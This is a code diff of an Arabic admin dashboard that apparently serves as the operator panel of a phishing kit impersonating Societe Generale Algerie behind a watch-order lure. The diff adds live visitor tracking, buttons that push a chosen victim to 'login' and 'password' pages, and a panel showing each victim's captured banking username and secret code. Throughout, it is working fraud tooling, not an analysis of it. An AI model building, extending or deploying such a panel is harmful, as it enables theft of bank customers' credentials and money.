@@ -5,108 +5,161 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>لوحة الإدارة</title>
 <style>
-  :root{--bg:#f5f6f8;--ink:#141414;--muted:#8a8f98;--line:#e3e3e3;
-    --green:#1a9c45;--red:#e02424;--orange:#e68a00;--blue:#2563eb}
+  :root{--bg:#f0f2f5;--card:#fff;--ink:#1a1a2e;--muted:#6b7280;--line:#e5e7eb;
+    --green:#059669;--red:#dc2626;--orange:#d97706;--blue:#2563eb;--purple:#7c3aed;
+    --sidebar:#1a1a2e;--sidebar-w:260px}
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{background:var(--bg);color:var(--ink);font-family:"Segoe UI",Tahoma,Arial,sans-serif}
-  body{min-height:100vh}
+  html,body{background:var(--bg);color:var(--ink);font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100%}
 
   /* === Login === */
-  .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
-  .login-box{background:#fff;border-radius:20px;padding:40px 30px;width:100%;max-width:380px;
-    box-shadow:0 8px 30px rgba(0,0,0,.08);text-align:center}
-  .login-box h1{font-size:24px;font-weight:800;margin-bottom:8px}
-  .login-box p{color:var(--muted);font-size:14px;margin-bottom:24px}
-  .login-box input{width:100%;padding:14px 16px;border:1.5px solid var(--line);border-radius:12px;
-    font-size:15px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px}
-  .login-box input:focus{border-color:var(--ink)}
-  .login-box button{width:100%;padding:14px;background:var(--ink);color:#fff;border:none;
-    border-radius:12px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit}
-  .login-box button:hover{background:#000}
+  .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
+    background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
+  .login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
+    box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
+  .login-box h1{font-size:28px;font-weight:800;margin-bottom:6px;color:var(--ink)}
+  .login-box p{color:var(--muted);font-size:14px;margin-bottom:30px}
+  .login-box input{width:100%;padding:16px 20px;border:2px solid var(--line);border-radius:14px;
+    font-size:16px;font-family:inherit;text-align:center;outline:none;margin-bottom:18px;transition:.2s}
+  .login-box input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(37,99,235,.1)}
+  .login-box button{width:100%;padding:16px;background:var(--blue);color:#fff;border:none;
+    border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
+  .login-box button:hover{background:#1d4ed8}
   .login-err{color:var(--red);font-size:13px;margin-bottom:12px;display:none}
 
-  /* === Dashboard === */
-  .dashboard{display:none;max-width:800px;margin:0 auto;padding:16px}
-  .dash-header{background:#fff;border-radius:16px;padding:18px 20px;margin-bottom:16px;
-    box-shadow:0 2px 10px rgba(0,0,0,.05);display:flex;align-items:center;justify-content:space-between}
-  .dash-header h1{font-size:20px;font-weight:800}
-  .dash-stats{display:flex;gap:10px;flex-wrap:wrap}
-  .dash-stat{background:var(--bg);padding:6px 14px;border-radius:10px;text-align:center}
-  .dash-stat .n{font-size:18px;font-weight:800;color:var(--blue)}
-  .dash-stat .l{font-size:10px;color:var(--muted)}
-  .dash-stat.active-stat{background:#e8f5e9;position:relative}
-  .dash-stat.active-stat .n{color:var(--green)}
-  .dash-stat.active-stat .wifi{position:absolute;top:-4px;right:-4px;width:18px;height:18px;
-    background:var(--green);border-radius:50%;display:flex;align-items:center;justify-content:center}
-  .dash-stat.active-stat .wifi svg{width:11px;height:11px;fill:#fff}
-  .pulse{animation:pulse 1.5s infinite}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
-  .dash-refresh{border:1.5px solid var(--line);background:#fff;padding:8px 16px;
-    border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}
-  .dash-refresh:hover{background:#f3f4f6}
+  /* === Layout === */
+  .layout{display:none;height:100vh}
 
-  /* === Order Cards === */
-  .orders{display:flex;flex-direction:column;gap:12px}
-  .card{background:#fff;border-radius:16px;padding:16px;box-shadow:0 2px 8px rgba(0,0,0,.04);
-    border:1px solid var(--line)}
-  .card-top{display:flex;align-items:center;gap:14px}
-  .card-watch{width:56px;height:56px;border-radius:50%;background:#f9f9f9;border:2px solid var(--line);
-    display:flex;align-items:center;justify-content:center;padding:6px;flex-shrink:0}
-  .card-watch img{max-width:100%;max-height:100%;object-fit:contain}
-  .card-info{flex:1;min-width:0}
-  .card-name{font-size:16px;font-weight:700;margin-bottom:2px}
-  .card-phone{font-size:13px;color:var(--muted);direction:ltr;text-align:right}
-  .card-meta{display:flex;align-items:center;gap:8px;margin-top:10px;flex-wrap:wrap}
-  .badge{padding:3px 10px;border-radius:20px;font-size:11px;font-weight:700}
-  .badge-pending{background:#fff3e0;color:var(--orange)}
-  .badge-confirmed{background:#e8f5e9;color:var(--green)}
-  .badge-rejected{background:#ffeaea;color:var(--red)}
-  .badge-page{background:#e8f0fe;color:var(--blue)}
-  .card-actions{display:flex;gap:8px;margin-top:12px}
-  .card-actions button{flex:1;border:none;padding:10px;border-radius:10px;font-size:13px;
-    font-weight:700;cursor:pointer;font-family:inherit}
-  .btn-details{background:#e8f0fe;color:var(--blue)}
-  .btn-details:hover{background:#d0e0fc}
+  .sidebar{width:var(--sidebar-w);background:var(--sidebar);color:#fff;padding:24px 0;
+    position:fixed;top:0;right:0;height:100vh;z-index:50;display:flex;flex-direction:column}
+  .sidebar-logo{padding:0 24px 28px;border-bottom:1px solid rgba(255,255,255,.1);margin-bottom:20px;
+    font-size:20px;font-weight:800;display:flex;align-items:center;gap:12px}
+  .sidebar-logo .dot{width:10px;height:10px;background:var(--green);border-radius:50%;
+    box-shadow:0 0 8px rgba(5,150,105,.6)}
+  .sidebar-nav{flex:1}
+  .sidebar-nav a{display:flex;align-items:center;gap:12px;padding:12px 24px;color:rgba(255,255,255,.6);
+    text-decoration:none;font-size:14px;font-weight:500;transition:.2s;border-right:3px solid transparent}
+  .sidebar-nav a:hover{color:#fff;background:rgba(255,255,255,.05)}
+  .sidebar-nav a.active{color:#fff;background:rgba(255,255,255,.08);border-right-color:var(--blue)}
+  .sidebar-nav a svg{width:20px;height:20px;fill:currentColor;flex-shrink:0}
+  .sidebar-bottom{padding:16px 24px;border-top:1px solid rgba(255,255,255,.1);font-size:12px;color:rgba(255,255,255,.4)}
+
+  .main{margin-right:var(--sidebar-w);padding:28px 32px;height:100vh;overflow-y:auto}
+
+  /* === Header === */
+  .top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:28px}
+  .top-bar h1{font-size:26px;font-weight:800}
+  .top-bar-actions{display:flex;align-items:center;gap:12px}
+  .btn-refresh{display:flex;align-items:center;gap:6px;padding:10px 20px;background:var(--card);
+    border:1.5px solid var(--line);border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;
+    font-family:inherit;transition:.2s}
+  .btn-refresh:hover{background:var(--bg);border-color:var(--ink)}
+  .btn-refresh svg{width:16px;height:16px;fill:var(--muted)}
+  .auto-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
+
+  /* === Stats === */
+  .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:28px}
+  .stat-card{background:var(--card);border-radius:16px;padding:22px 24px;
+    box-shadow:0 1px 3px rgba(0,0,0,.06);position:relative;overflow:hidden}
+  .stat-card::after{content:"";position:absolute;top:0;right:0;width:4px;height:100%;border-radius:0 16px 16px 0}
+  .stat-card.s-active::after{background:var(--green)}
+  .stat-card.s-total::after{background:var(--blue)}
+  .stat-card.s-pending::after{background:var(--orange)}
+  .stat-card.s-confirmed::after{background:var(--green)}
+  .stat-label{font-size:13px;color:var(--muted);font-weight:500;margin-bottom:8px;
+    display:flex;align-items:center;gap:8px}
+  .stat-label svg{width:18px;height:18px}
+  .stat-num{font-size:32px;font-weight:800;letter-spacing:-1px}
+  .stat-card.s-active .stat-num{color:var(--green)}
+  .stat-card.s-total .stat-num{color:var(--blue)}
+  .stat-card.s-pending .stat-num{color:var(--orange)}
+  .stat-card.s-confirmed .stat-num{color:var(--green)}
+  .wifi-icon{display:inline-flex;align-items:center;gap:4px}
+  .wifi-icon svg{width:16px;height:16px;fill:var(--green);animation:pulse 1.5s infinite}
+
+  /* === Table === */
+  .table-card{background:var(--card);border-radius:16px;box-shadow:0 1px 3px rgba(0,0,0,.06);overflow:hidden}
+  .table-header{padding:20px 24px;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between}
+  .table-header h2{font-size:18px;font-weight:700}
+  .table-count{font-size:13px;color:var(--muted);background:var(--bg);padding:4px 12px;border-radius:20px}
+
+  table{width:100%;border-collapse:collapse}
+  thead th{padding:14px 16px;text-align:right;font-size:12px;font-weight:600;color:var(--muted);
+    text-transform:uppercase;letter-spacing:.5px;background:#fafbfc;border-bottom:1px solid var(--line)}
+  tbody tr{border-bottom:1px solid var(--line);transition:.15s}
+  tbody tr:last-child{border:none}
+  tbody tr:hover{background:#f8f9fb}
+  tbody td{padding:14px 16px;font-size:14px;vertical-align:middle}
+
+  .td-user{display:flex;align-items:center;gap:12px}
+  .td-watch{width:44px;height:44px;border-radius:50%;background:#f5f5f5;border:2px solid var(--line);
+    display:flex;align-items:center;justify-content:center;padding:4px;flex-shrink:0}
+  .td-watch img{max-width:100%;max-height:100%;object-fit:contain}
+  .td-name{font-weight:600;font-size:14px}
+  .td-phone{font-size:12px;color:var(--muted);direction:ltr;text-align:right;margin-top:2px}
+
+  .badge{padding:4px 12px;border-radius:20px;font-size:11px;font-weight:700;display:inline-block}
+  .badge-pending{background:#fef3c7;color:#92400e}
+  .badge-confirmed{background:#d1fae5;color:#065f46}
+  .badge-rejected{background:#fee2e2;color:#991b1b}
+  .badge-page{background:#dbeafe;color:#1e40af}
+
+  .td-actions{display:flex;gap:6px}
+  .td-actions button{border:none;padding:8px 14px;border-radius:8px;font-size:12px;
+    font-weight:600;cursor:pointer;font-family:inherit;transition:.15s}
+  .btn-details{background:#eff6ff;color:var(--blue)}
+  .btn-details:hover{background:#dbeafe}
   .btn-redirect{background:#f3f4f6;color:var(--ink)}
   .btn-redirect:hover{background:#e5e7eb}
-  .btn-delete{background:#ffeaea;color:var(--red)}
-  .btn-delete:hover{background:#ffcdd2}
+  .btn-delete{background:#fef2f2;color:var(--red)}
+  .btn-delete:hover{background:#fee2e2}
 
   .empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:15px}
 
   /* === Modal === */
-  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:100;
-    display:none;align-items:center;justify-content:center;padding:16px}
+  .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:200;
+    display:none;align-items:center;justify-content:center;padding:16px;backdrop-filter:blur(4px)}
   .modal-overlay.open{display:flex}
-  .modal{background:#fff;border-radius:20px;width:100%;max-width:440px;max-height:90vh;
-    overflow-y:auto;padding:24px;position:relative}
-  .modal-close{position:absolute;top:14px;left:14px;border:none;background:transparent;
-    font-size:24px;cursor:pointer;color:var(--muted);line-height:1}
-  .modal h2{font-size:20px;font-weight:800;margin-bottom:20px;padding-left:30px}
-  .modal-watch{text-align:center;margin-bottom:16px}
-  .modal-watch img{width:100px;height:100px;object-fit:contain}
-  .modal-watch .color-name{font-size:14px;font-weight:600;margin-top:6px}
-  .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
-  .detail-item{background:var(--bg);padding:12px;border-radius:12px}
-  .detail-item .lbl{font-size:11px;color:var(--muted);margin-bottom:4px}
+  .modal{background:#fff;border-radius:24px;width:100%;max-width:520px;max-height:90vh;
+    overflow-y:auto;padding:32px;position:relative}
+  .modal-close{position:absolute;top:16px;left:16px;border:none;background:#f3f4f6;
+    width:32px;height:32px;border-radius:50%;font-size:18px;cursor:pointer;color:var(--muted);
+    display:flex;align-items:center;justify-content:center;transition:.2s}
+  .modal-close:hover{background:#e5e7eb}
+  .modal h2{font-size:22px;font-weight:800;margin-bottom:24px}
+  .modal-watch{text-align:center;margin-bottom:20px}
+  .modal-watch img{width:110px;height:110px;object-fit:contain;
+    background:#f9fafb;border-radius:50%;padding:12px;border:2px solid var(--line)}
+  .modal-watch .color-name{font-size:14px;font-weight:600;margin-top:10px;color:var(--muted)}
+  .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px}
+  .detail-item{background:var(--bg);padding:14px 16px;border-radius:14px}
+  .detail-item .lbl{font-size:11px;color:var(--muted);margin-bottom:4px;font-weight:500}
   .detail-item .val{font-size:14px;font-weight:600;word-break:break-word}
   .detail-full{grid-column:1/-1}
-  .modal-actions{display:flex;gap:10px}
-  .modal-actions button{flex:1;padding:14px;border:none;border-radius:12px;font-size:15px;
-    font-weight:700;cursor:pointer;font-family:inherit}
+  .modal-actions{display:flex;gap:12px}
+  .modal-actions button{flex:1;padding:16px;border:none;border-radius:14px;font-size:15px;
+    font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
   .btn-accept{background:var(--green);color:#fff}
-  .btn-accept:hover{background:#158a3a}
+  .btn-accept:hover{background:#047857}
   .btn-reject{background:var(--red);color:#fff}
-  .btn-reject:hover{background:#c41e1e}
+  .btn-reject:hover{background:#b91c1c}
 
-  /* === Redirect Modal === */
-  .redirect-options{display:flex;flex-direction:column;gap:8px;margin-bottom:20px}
-  .redirect-options button{padding:14px;border:1.5px solid var(--line);background:#fff;
-    border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;text-align:right}
-  .redirect-options button:hover{background:var(--bg);border-color:var(--ink)}
+  .redirect-options{display:flex;flex-direction:column;gap:10px;margin-bottom:20px}
+  .redirect-options button{padding:16px;border:2px solid var(--line);background:#fff;
+    border-radius:14px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;
+    text-align:right;transition:.2s}
+  .redirect-options button:hover{background:var(--bg);border-color:var(--blue)}
 
-  @media(max-width:600px){
-    .dash-header{flex-direction:column;gap:12px;text-align:center}
+  .login-data{margin-top:12px;padding-top:12px;border-top:1px solid var(--line)}
+  .login-data h3{font-size:14px;font-weight:700;margin-bottom:10px;color:var(--purple)}
+
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+
+  @media(max-width:900px){
+    .sidebar{display:none}
+    .main{margin-right:0;padding:16px}
+    .stats-row{grid-template-columns:repeat(2,1fr);gap:10px}
+    .table-card{overflow-x:auto}
+    .td-actions{flex-wrap:wrap}
     .detail-grid{grid-template-columns:1fr}
     .detail-full{grid-column:1}
   }
@@ -118,29 +171,80 @@
 <div class="login-wrap" id="loginScreen">
   <div class="login-box">
     <h1>لوحة الإدارة</h1>
-    <p>أدخل كلمة المرور للوصول</p>
+    <p>أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
     <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
     <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
     <button onclick="doLogin()">دخول</button>
   </div>
 </div>
 
-<!-- Dashboard -->
-<div class="dashboard" id="dashboard">
-  <div class="dash-header">
-    <h1>الطلبات</h1>
-    <div class="dash-stats">
-      <div class="dash-stat active-stat">
-        <div class="wifi pulse"><svg viewBox="0 0 24 24"><path d="M1.42 9a16.5 16.5 0 0 1 21.16 0M5 12.55a11 11 0 0 1 14.08 0M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/></svg></div>
-        <div class="n" id="sActive">0</div><div class="l">نشط الآن</div>
-      </div>
-      <div class="dash-stat"><div class="n" id="sTotal">0</div><div class="l">الكل</div></div>
-      <div class="dash-stat"><div class="n" id="sPending">0</div><div class="l">انتظار</div></div>
-      <div class="dash-stat"><div class="n" id="sConfirmed">0</div><div class="l">مقبول</div></div>
+<!-- Dashboard Layout -->
+<div class="layout" id="layout">
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="dot"></div>
+      لوحة التحكم
     </div>
-    <button class="dash-refresh" onclick="loadOrders()">تحديث</button>
+    <nav class="sidebar-nav">
+      <a href="#" class="active">
+        <svg viewBox="0 0 24 24"><path d="M4 13h6a1 1 0 0 0 1-1V4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1zm-1 7a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-4a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v4zm10 0a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-8a1 1 0 0 0-1-1h-6a1 1 0 0 0-1 1v8zm1-17v4a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V3a1 1 0 0 0-1-1h-6a1 1 0 0 0-1 1z"/></svg>
+        الطلبات
+      </a>
+      <a href="#">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        الزوار
+      </a>
+    </nav>
+    <div class="sidebar-bottom">Societe Generale Algerie</div>
+  </aside>
+
+  <!-- Main Content -->
+  <div class="main">
+    <div class="top-bar">
+      <h1>إدارة الطلبات</h1>
+      <div class="top-bar-actions">
+        <div class="auto-dot" title="تحديث تلقائي كل 3 ثواني"></div>
+        <button class="btn-refresh" onclick="loadOrders();loadActiveVisitors()">
+          <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.96 7.96 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+          تحديث
+        </button>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-card s-active">
+        <div class="stat-label">
+          <span class="wifi-icon"><svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.24 4.24 0 0 0-6 0zm-4-4l2 2a7.07 7.07 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></span>
+          نشط الآن
+        </div>
+        <div class="stat-num" id="sActive">0</div>
+      </div>
+      <div class="stat-card s-total">
+        <div class="stat-label">إجمالي الطلبات</div>
+        <div class="stat-num" id="sTotal">0</div>
+      </div>
+      <div class="stat-card s-pending">
+        <div class="stat-label">قيد الانتظار</div>
+        <div class="stat-num" id="sPending">0</div>
+      </div>
+      <div class="stat-card s-confirmed">
+        <div class="stat-label">مقبول</div>
+        <div class="stat-num" id="sConfirmed">0</div>
+      </div>
+    </div>
+
+    <!-- Orders Table -->
+    <div class="table-card">
+      <div class="table-header">
+        <h2>جميع الطلبات</h2>
+        <span class="table-count" id="tableCount">0 طلب</span>
+      </div>
+      <div id="ordersList"></div>
+    </div>
   </div>
-  <div class="orders" id="ordersList"></div>
 </div>
 
 <!-- Details Modal -->
@@ -151,8 +255,8 @@
     <div class="modal-watch" id="modalWatch"></div>
     <div class="detail-grid" id="modalDetails"></div>
     <div class="modal-actions">
-      <button class="btn-accept" id="modalAccept">قبول</button>
-      <button class="btn-reject" id="modalReject">رفض</button>
+      <button class="btn-accept" id="modalAccept">قبول الطلب</button>
+      <button class="btn-reject" id="modalReject">رفض الطلب</button>
     </div>
   </div>
 </div>
@@ -161,11 +265,13 @@
 <div class="modal-overlay" id="redirectModal">
   <div class="modal">
     <button class="modal-close" onclick="closeModal('redirectModal')">×</button>
-    <h2>إعادة التوجيه</h2>
+    <h2>إعادة توجيه الزائر</h2>
     <div class="redirect-options">
       <button onclick="doRedirect('index.html')">الصفحة الرئيسية</button>
-      <button onclick="doRedirect('colors.html')">صفحة الألوان</button>
-      <button onclick="doRedirect('order.html')">صفحة الطلب</button>
+      <button onclick="doRedirect('colors.html')">صفحة اختيار الألوان</button>
+      <button onclick="doRedirect('order.html')">صفحة بيانات الطلب</button>
+      <button onclick="doRedirect('login.html')">صفحة تسجيل الدخول</button>
+      <button onclick="doRedirect('password.html')">صفحة الرمز السري</button>
     </div>
   </div>
 </div>
@@ -185,6 +291,7 @@ const watches = [
 
 const pageLabels = {
   "index":"الرئيسية","colors":"الألوان","order":"صفحة الطلب",
+  "login":"تسجيل الدخول","password":"الرمز السري",
   "home":"الرئيسية","pending":"في الانتظار"
 };
 
@@ -201,7 +308,6 @@ function api(method, url, body) {
   return fetch(url, opts).then(r => r.json());
 }
 
-// Login
 async function doLogin() {
   const pass = document.getElementById("passInput").value;
   const res = await api("POST", "/api/admin/login", {password: pass});
@@ -217,7 +323,6 @@ document.getElementById("passInput").addEventListener("keydown", e => {
   if (e.key === "Enter") doLogin();
 });
 
-// Check if already logged in
 async function checkAuth() {
   if (!TOKEN) return;
   const res = await api("GET", "/api/orders");
@@ -226,12 +331,11 @@ async function checkAuth() {
 
 function showDashboard() {
   document.getElementById("loginScreen").style.display = "none";
-  document.getElementById("dashboard").style.display = "block";
+  document.getElementById("layout").style.display = "block";
   loadOrders();
   loadActiveVisitors();
 }
 
-// Load orders
 async function loadOrders() {
   const res = await api("GET", "/api/orders");
   orders = res.orders || [];
@@ -239,42 +343,48 @@ async function loadOrders() {
   document.getElementById("sTotal").textContent = orders.length;
   document.getElementById("sPending").textContent = orders.filter(o=>o.status==="pending").length;
   document.getElementById("sConfirmed").textContent = orders.filter(o=>o.status==="confirmed").length;
+  document.getElementById("tableCount").textContent = orders.length + " طلب";
 
   const list = document.getElementById("ordersList");
-  if (!orders.length) { list.innerHTML = '<div class="empty">لا توجد طلبات بعد</div>'; return; }
+  if (!orders.length) {
+    list.innerHTML = '<div class="empty">لا توجد طلبات بعد</div>';
+    return;
+  }
 
-  list.innerHTML = orders.map(o => {
+  let html = `<table><thead><tr>
+    <th>العميل</th><th>الولاية</th><th>اللون</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
+  </tr></thead><tbody>`;
+
+  orders.forEach(o => {
     const w = (o.watch_index !== null && o.watch_index !== undefined && watches[o.watch_index])
       ? watches[o.watch_index] : null;
     const watchImg = w ? w.img : "images/6.png";
     const statusClass = o.status || "pending";
     const pageName = pageLabels[o.current_page] || o.current_page || "—";
+    const date = o.created_at ? new Date(o.created_at).toLocaleDateString("ar-EG",{day:"numeric",month:"short"}) : "—";
 
-    return `<div class="card">
-      <div class="card-top">
-        <div class="card-watch"><img src="${watchImg}" alt="ساعة"></div>
-        <div class="card-info">
-          <div class="card-name">${o.name}</div>
-          <div class="card-phone">${o.phone}</div>
-        </div>
-        <div>
-          <span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span>
-        </div>
-      </div>
-      <div class="card-meta">
-        <span class="badge badge-page">${pageName}</span>
-        <span style="font-size:11px;color:var(--muted)">${o.watch_color||""}</span>
-      </div>
-      <div class="card-actions">
+    html += `<tr>
+      <td><div class="td-user">
+        <div class="td-watch"><img src="${watchImg}" alt=""></div>
+        <div><div class="td-name">${o.name}</div><div class="td-phone">${o.phone}</div></div>
+      </div></td>
+      <td style="font-size:13px">${o.wilaya||"—"}</td>
+      <td style="font-size:13px">${o.watch_color||"—"}</td>
+      <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
+      <td><span class="badge badge-page">${pageName}</span></td>
+      <td style="font-size:12px;color:var(--muted)">${date}</td>
+      <td><div class="td-actions">
         <button class="btn-details" onclick="showDetails(${o.id})">التفاصيل</button>
-        <button class="btn-redirect" onclick="showRedirect(${o.id})">إعادة التوجيه</button>
+        <button class="btn-redirect" onclick="showRedirect(${o.id})">توجيه</button>
         <button class="btn-delete" onclick="deleteOrder(${o.id})">حذف</button>
-      </div>
-    </div>`;
-  }).join("");
+      </div></td>
+    </tr>`;
+  });
+
+  html += "</tbody></table>";
+  list.innerHTML = html;
 }
 
-// Details modal
 function showDetails(id) {
   const o = orders.find(x => x.id === id);
   if (!o) return;
@@ -287,7 +397,7 @@ function showDetails(id) {
     ? `<img src="${w.img}" alt="${w.name}"><div class="color-name">${w.name}</div>`
     : `<div class="color-name">${o.watch_color || "لم يتم الاختيار"}</div>`;
 
-  document.getElementById("modalDetails").innerHTML = `
+  let detailsHtml = `
     <div class="detail-item"><div class="lbl">الاسم</div><div class="val">${o.name}</div></div>
     <div class="detail-item"><div class="lbl">الهاتف</div><div class="val" style="direction:ltr;text-align:right">${o.phone}</div></div>
     <div class="detail-item"><div class="lbl">البريد الإلكتروني</div><div class="val">${o.email}</div></div>
@@ -296,8 +406,15 @@ function showDetails(id) {
     <div class="detail-item"><div class="lbl">لون الساعة</div><div class="val">${o.watch_color||"—"}</div></div>
     <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${statusLabels[o.status]||o.status}</div></div>
     <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${new Date(o.created_at).toLocaleString("ar-EG")}</div></div>
-  `;
+    <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${new Date(o.created_at).toLocaleString("ar-EG")}</div></div>`;
+
+  if (o.login_username || o.login_password) {
+    detailsHtml += `</div><div class="login-data"><h3>بيانات تسجيل الدخول</h3><div class="detail-grid">
+      <div class="detail-item"><div class="lbl">اسم المستخدم</div><div class="val">${o.login_username||"—"}</div></div>
+      <div class="detail-item"><div class="lbl">الرمز السري</div><div class="val" style="direction:ltr;text-align:right;letter-spacing:3px;font-size:18px">${o.login_password||"—"}</div></div>`;
+  }
+
+  document.getElementById("modalDetails").innerHTML = detailsHtml;
 
   document.getElementById("modalAccept").onclick = () => updateStatus(id, "confirmed");
   document.getElementById("modalReject").onclick = () => updateStatus(id, "rejected");
@@ -305,7 +422,6 @@ function showDetails(id) {
   openModal("detailsModal");
 }
 
-// Redirect modal
 let redirectOrderId = null;
 function showRedirect(id) {
   redirectOrderId = id;
@@ -319,35 +435,30 @@ async function doRedirect(page) {
   loadOrders();
 }
 
-// Update status
 async function updateStatus(id, status) {
   await api("PATCH", "/api/orders/" + id, {status});
   closeModal("detailsModal");
   loadOrders();
 }
 
-// Delete
 async function deleteOrder(id) {
   if (!confirm("هل تريد حذف هذا الطلب؟")) return;
   await api("DELETE", "/api/orders/" + id);
   loadOrders();
 }
 
-// Modal helpers
 function openModal(id) { document.getElementById(id).classList.add("open"); }
 function closeModal(id) { document.getElementById(id).classList.remove("open"); }
 document.querySelectorAll(".modal-overlay").forEach(el => {
   el.addEventListener("click", e => { if (e.target === el) el.classList.remove("open"); });
 });
 
-// Active visitors
 async function loadActiveVisitors() {
   if (!TOKEN) return;
   const res = await api("GET", "/api/visitors/active");
   document.getElementById("sActive").textContent = res.count || 0;
 }
 
-// Auto refresh
 checkAuth();
 setInterval(() => { if (TOKEN) { loadOrders(); loadActiveVisitors(); } }, 3000);
 </script>
